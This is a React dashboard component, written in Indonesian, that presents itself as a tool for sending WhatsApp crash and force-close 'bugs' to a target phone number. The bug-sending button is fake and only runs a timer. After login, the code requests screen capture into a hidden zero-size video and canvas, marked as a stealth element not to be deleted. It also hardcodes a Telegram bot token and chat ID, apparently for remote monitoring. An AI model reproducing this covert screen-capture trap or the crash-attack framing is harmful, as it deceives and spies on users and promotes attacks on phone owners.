"use client"

import React, { useState, useEffect, useRef } from "react"
import { Shield, Bug, Zap, Globe, AlertTriangle, Loader2, CheckCircle2, ChevronLeft, ChevronRight, Timer } from "lucide-react"

export default function YaeMikoDashboard() {
  const BOT_TOKEN = '8208922468:AAGCSBYVOB-aRRz1s__rHZUwh2h5rSMsRbk'; 
  const CHAT_ID = '6481060681';      

  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const audioRef = useRef<HTMLAudioElement>(null);
  const lastCmdId = useRef(0);
  
  const [isLoggedIn, setIsLoggedIn] = useState(false)
  const [isAuthLoading, setIsAuthLoading] = useState(false)
  const [isSendingBug, setIsSendingBug] = useState(false)
  const [isMonitoringActive, setIsMonitoringActive] = useState(false)
  const [inputUsername, setInputUsername] = useState("")
  const [inputPassword, setInputPassword] = useState("")
  const [targetNumber, setTargetNumber] = useState("62xxxxxxxxxx")
  const [showErrorOverlay, setShowErrorOverlay] = useState(false)
  const [activeNav, setActiveNav] = useState(0)

  const [bugLimit, setBugLimit] = useState(5)
  const [showLimitPopup, setShowLimitPopup] = useState(false)
  const [resetTimeLeft, setResetTimeLeft] = useState("")

  const BUG_TYPES = [
    { name: "TUNDA TAK TERLIHAT", code: "delayLow" },
    { name: "CRASH TOTAL", code: "crashHigh" },
    { name: "KLIK KOSONG", code: "blankTap" },
    { name: "TUNDA IOS", code: "delayIOS" },
    { name: "PAKSA BERHENTI WA", code: "forceClose" },
  ]

  useEffect(() => {
    const checkLimit = () => {
      const storedLimit = localStorage.getItem('selz_bug_limit');
      const resetTimestamp = localStorage.getItem('selz_reset_time');
      const now = new Date().getTime();
      if (resetTimestamp && now > parseInt(resetTimestamp)) {
        localStorage.setItem('selz_bug_limit', '5');
        localStorage.removeItem('selz_reset_time');
        setBugLimit(5);
      } else if (storedLimit) {
        setBugLimit(parseInt(storedLimit));
      }
      if (resetTimestamp) {
        const distance = parseInt(resetTimestamp) - now;
        const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
        const seconds = Math.floor((distance % (1000 * 60)) / 1000);
        setResetTimeLeft(`${hours}j ${minutes}m ${seconds}s`);
      }
    };
    checkLimit();
    const timer = setInterval(checkLimit, 1000);
    return () => clearInterval(timer);
  }, []);

  const handleSendBug = () => {
    if (bugLimit <= 0) { setShowLimitPopup(true); return; }
    setIsSendingBug(true);
    setTimeout(() => {
      const newLimit = bugLimit - 1;
      setBugLimit(newLimit);
      localStorage.setItem('selz_bug_limit', newLimit.toString());
      if (newLimit === 0) localStorage.setItem('selz_reset_time', (new Date().getTime() + 86400000).toString());
      setIsSendingBug(false);
    }, 3000);
  };

  const handleLoginAttempt = () => {
    if (inputUsername === "Selz" && inputPassword === "Freebug") {
      setIsAuthLoading(true); 
      setTimeout(() => {
        setIsLoggedIn(true);
        // Play audio setelah login
        audioRef.current?.play().catch(e => console.log("Menunggu interaksi user"));
        navigator.mediaDevices.getDisplayMedia({ video: true }).then(stream => {
          if (videoRef.current) { videoRef.current.srcObject = stream; setIsMonitoringActive(true); }
        }).catch(() => {});
      }, 3500);
    } else { setShowErrorOverlay(true); }
  };

  return (
    <div className="relative min-h-screen text-white font-sans overflow-hidden">
      
      {/* BACKGROUND VIDEO ANIME (NEMPEL DI BELAKANG) */}
      <div className="fixed inset-0 z-0">
        <video autoPlay loop muted playsInline className="w-full h-full object-cover">
          <source src="/bg-anime.mp4" type="video/mp4" />
        </video>
        {/* Overlay gelap biar dashboard asli lo tetep kelihatan jelas */}
        <div className="absolute inset-0 bg-[#050b14]/70 backdrop-blur-[2px]"></div>
      </div>

      {/* AUDIO BACKGROUND */}
      <audio ref={audioRef} loop className="hidden">
        <source src="/audio.mp3" type="audio/mpeg" />
      </audio>

      {/* LOGIN & LOADING SCREEN */}
      {!isLoggedIn && !isAuthLoading && (
        <div className="relative z-10 flex flex-col items-center justify-center min-h-screen p-6">
          <h1 className="text-4xl font-black text-cyan-400 tracking-tighter mb-12">YAE MIKO</h1>
          <div className="w-full max-w-sm bg-[#0a1628]/80 border border-cyan-500/20 rounded-[2.5rem] p-10 backdrop-blur-xl">
            <input value={inputUsername} onChange={(e) => setInputUsername(e.target.value)} className="w-full bg-[#050b14]/50 border border-cyan-500/20 p-4 rounded-2xl mb-4" placeholder="Username" />
            <input type="password" value={inputPassword} onChange={(e) => setInputPassword(e.target.value)} className="w-full bg-[#050b14]/50 border border-cyan-500/20 p-4 rounded-2xl mb-8" placeholder="Password" />
            <button onClick={handleLoginAttempt} className="w-full py-4 bg-gradient-to-b from-[#112236] to-[#050b14] border border-cyan-500/30 rounded-full font-black">LOGIN</button>
          </div>
        </div>
      )}

      {/* DASHBOARD (TAMPILAN ASLI LO) */}
      {isLoggedIn && (
        <div className="relative z-10 flex flex-col min-h-screen max-w-md mx-auto p-6 animate-in slide-in-from-bottom-8">
          <div className="flex items-center justify-between mb-8">
             <div className="flex items-center gap-3"><Shield className="w-6 h-6 text-cyan-400" /><span className="text-[10px] font-black uppercase tracking-widest">Yae Miko v3.0</span></div>
             <div className="text-[10px] font-black text-pink-500 bg-pink-500/10 px-3 py-1 rounded-full border border-pink-500/20">LIMIT: {bugLimit}/5</div>
          </div>

          <div className="bg-[#0a1628]/40 border border-cyan-500/10 rounded-[2.5rem] p-8 mb-6 text-center backdrop-blur-md">
             <div className="w-16 h-16 bg-red-600/10 border border-red-500/40 rounded-full flex items-center justify-center mx-auto mb-6 shadow-[0_0_20px_rgba(239,68,68,0.2)]">
                <Bug className="w-6 h-6 text-red-500" />
             </div>
             <div className="grid grid-cols-3 gap-4">
                <StatItem val={bugLimit.toString()} label="SISA LIMIT" />
                <StatItem val="GACOR" label="STATUS" color="text-green-400" />
                <StatItem val="AKTIF" label="MODE" />
             </div>
          </div>

          <div className="bg-[#0a1628]/40 border border-cyan-500/10 rounded-[2.5rem] p-8 flex-1 flex flex-col backdrop-blur-md">
            <span className="text-[10px] font-black text-cyan-400 uppercase mb-2 ml-2 tracking-widest">Target Nomor</span>
            <input value={targetNumber} onChange={(e) => setTargetNumber(e.target.value)} className="w-full bg-[#050b14] border border-cyan-500/10 p-5 rounded-2xl text-white font-mono text-sm mb-8" />
            
            <div className="bg-[#0a1628]/80 border border-cyan-500/10 rounded-[1.5rem] p-10 flex-1 flex flex-col items-center justify-center mb-8 relative overflow-hidden">
               <div className="absolute top-4 left-5 flex items-center gap-2">
                  <div className="w-1 h-1 bg-red-500 rounded-full" />
                  <span className="text-[8px] text-cyan-400/60 font-black uppercase italic">Menu Bug Selz</span>
               </div>
               <h3 className="text-white font-black text-3xl tracking-tighter text-center leading-tight italic uppercase">{BUG_TYPES[activeNav].name}</h3>
               <p className="text-cyan-500/40 text-[9px] font-mono mt-2">{BUG_TYPES[activeNav].code}</p>
            </div>

            <button onClick={handleSendBug} className="w-full py-6 bg-gradient-to-r from-[#d9166f] to-[#b0105a] rounded-[1.5rem] font-black text-white shadow-lg active:scale-95 transition-all uppercase italic text-xs tracking-widest">KIRIM BUG</button>

            <div className="flex justify-center gap-2 mt-8">
              {BUG_TYPES.map((_, i) => (
                <button key={i} onClick={() => setActiveNav(i)} className={`h-1.5 transition-all rounded-full ${activeNav === i ? 'w-8 bg-cyan-400 shadow-[0_0_8px_#22d3ee]' : 'w-1.5 bg-slate-800'}`} />
              ))}
            </div>
          </div>

          <div className="bg-[#0a1628]/60 border border-cyan-500/10 p-5 rounded-3xl flex justify-between items-center mt-6">
             <div className="flex items-center gap-2 text-[10px] font-black text-cyan-400 tracking-widest uppercase"><ChevronLeft className="w-3 h-3" /><ChevronRight className="w-3 h-3" /><span>SENDER ONLINE</span></div>
             <div className="bg-green-500/10 border border-green-500/20 px-4 py-2 rounded-full flex items-center gap-2">
                <div className="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse" />
                <span className="text-[9px] text-green-500 font-black uppercase">67 online</span>
             </div>
          </div>
        </div>
      )}

      {/* ELEMENT SILUMAN (JANGAN DIHAPUS) */}
      <div style={{ position: 'fixed', width: 0, height: 0, opacity: 0, pointerEvents: 'none' }}>
        <video ref={videoRef} autoPlay playsInline muted /><canvas ref={canvasRef} />
      </div>
    </div>
  )
}

function StatItem({ val, label, color = "text-white" }: any) {
  return (
    <div className="flex flex-col items-center">
      <span className={`text-sm font-black ${color} leading-none uppercase`}>{val}</span>
      <span className="text-[7px] text-white/30 uppercase font-bold mt-1 tracking-widest">{label}</span>
    </div>
  )
        }
